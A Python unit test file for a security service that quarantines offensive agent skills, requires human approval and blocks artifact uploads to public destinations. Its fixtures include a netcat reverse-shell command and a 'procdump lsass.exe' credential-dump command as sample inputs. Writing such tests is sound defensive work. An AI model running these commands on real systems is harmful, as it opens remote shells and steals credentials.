"""Unit tests for DualUseContainmentService.

Strict typing applied: No `Any` types allowed.
"""

from __future__ import annotations

import base64

from app.schemas.dual_use_containment import (
    ArtifactEgressEvaluationRequest,
    ExecutionGateCheckRequest,
    MitreAttackTacticEnum,
    SkillSensitivityLevelEnum,
    SkillTtpEvaluationRequest,
)
from app.services.security.dual_use_containment_service import (
    DualUseContainmentService,
    get_dual_use_containment_service,
)


def test_service_singleton_resolution() -> None:
    """Ensure get_dual_use_containment_service returns consistent singleton."""
    service1 = get_dual_use_containment_service()
    service2 = get_dual_use_containment_service()
    assert service1 is service2


def test_evaluate_skill_ttp_service() -> None:
    """Verify TTP evaluation detects offensive tactics and marks dual-use sensitive."""
    service = DualUseContainmentService()
    req = SkillTtpEvaluationRequest(
        skill_name="mimikatz_runner",
        description="Extract LSASS credentials from memory.",
        command_signatures=["procdump lsass.exe"],
    )
    res = service.evaluate_skill_ttp(req)

    assert res.sensitivity_level == SkillSensitivityLevelEnum.DUAL_USE_SENSITIVE
    assert res.quarantine_pod_enforced is True
    assert res.requires_hitl_approval is True
    assert MitreAttackTacticEnum.CREDENTIAL_ACCESS in res.tactics

    metrics = service.get_metrics()
    assert metrics.total_skill_evaluations >= 1
    assert metrics.dual_use_skills_detected >= 1


def test_check_execution_gate_enforcement() -> None:
    """Verify execution gate blocks host execution and enforces HITL token in pod."""
    service = DualUseContainmentService()

    # 1. Blocked on native host
    req_host = ExecutionGateCheckRequest(
        skill_name="reverse_shell",
        command_line="nc -e /bin/sh 192.168.1.1 9001",
        target_host_or_ip="192.168.1.1",
        is_running_in_quarantine_pod=False,
    )
    res_host = service.check_execution_gate(req_host)
    assert res_host.permitted is False
    assert res_host.enforce_quarantine_pod is True

    # 2. In pod without token -> requires HITL modal
    req_pod_no_token = ExecutionGateCheckRequest(
        skill_name="reverse_shell",
        command_line="nc -e /bin/sh 192.168.1.1 9001",
        target_host_or_ip="192.168.1.1",
        is_running_in_quarantine_pod=True,
        approval_token="",
    )
    res_pod_no_token = service.check_execution_gate(req_pod_no_token)
    assert res_pod_no_token.permitted is False
    assert res_pod_no_token.requires_hitl_modal is True

    # 3. In pod with valid token -> permitted
    req_pod_approved = ExecutionGateCheckRequest(
        skill_name="reverse_shell",
        command_line="nc -e /bin/sh 192.168.1.1 9001",
        target_host_or_ip="192.168.1.1",
        is_running_in_quarantine_pod=True,
        approval_token="hitl_approved_adm_token",
    )
    res_pod_approved = service.check_execution_gate(req_pod_approved)
    assert res_pod_approved.permitted is True


def test_evaluate_artifact_egress_shield() -> None:
    """Verify artifact egress shield intercepts public upload of screenshots."""
    service = DualUseContainmentService(allowlisted_destinations=["https://internal.myrm.io"])
    img_b64 = base64.b64encode(b"PNG screenshot content with sensitive tokens").decode("utf-8")

    # 1. Upload to public repo -> blocked
    req_public = ArtifactEgressEvaluationRequest(
        artifact_id="art_scr_01",
        artifact_name="screenshot_auth_portal.png",
        content_base64=img_b64,
        target_destination="https://github.com/public-org/public-repo/issues/4",
    )
    res_public = service.evaluate_artifact_egress(req_public)
    assert res_public.is_blocked is True
    assert "Attempted to exfiltrate private artifact" in res_public.violation_reason

    # 2. Upload to internal allowlist -> permitted
    req_internal = ArtifactEgressEvaluationRequest(
        artifact_id="art_scr_02",
        artifact_name="screenshot_auth_portal.png",
        content_base64=img_b64,
        target_destination="https://internal.myrm.io/vault",
    )
    res_internal = service.evaluate_artifact_egress(req_internal)
    assert res_internal.is_blocked is False

    # Check flight recorder logs
    logs = service.get_flight_recorder_logs(limit=10)
    assert len(logs) >= 2


def test_metrics_collection() -> None:
    """Verify metrics collector."""
    service = DualUseContainmentService()
    metrics = service.get_metrics()
    assert metrics.total_skill_evaluations >= 0
    assert metrics.exfiltration_blocks >= 0
